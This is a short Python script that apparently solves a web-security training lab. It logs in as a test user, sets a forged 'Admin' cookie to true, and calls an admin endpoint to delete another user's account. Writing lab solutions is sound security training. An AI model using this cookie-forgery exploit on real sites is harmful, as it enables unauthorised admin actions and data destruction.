import sys
import requests
from bs4 import BeautifulSoup

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def goto_administrator_panel(url):

    print()
    print(f"[*] Sending request as POST {url}/login")
    print()

    data = {
         "username": "wiener",
         "password": "peter",
    }

    s = requests.Session()

    print("[+] Sending GET request to /login to get the csrf token")
    response = s.get(url=url + "/login")
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")["value"]
    print(f"CSRF TOKEN: {csrf_token}")

    data["csrf"] = csrf_token

    response = s.post(url=url,data=data)

    print(f"All cookies after login: {s.cookies}")

    print("Changing cookie['Admin'] to true")

    s.cookies['Admin'] = "true"

    url = url + "/admin/delete"

    data = {
        "username": "carlos"
    }

    response = s.get(url, params=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        goto_administrator_panel(url)
        verify_if_lab_solved(url)
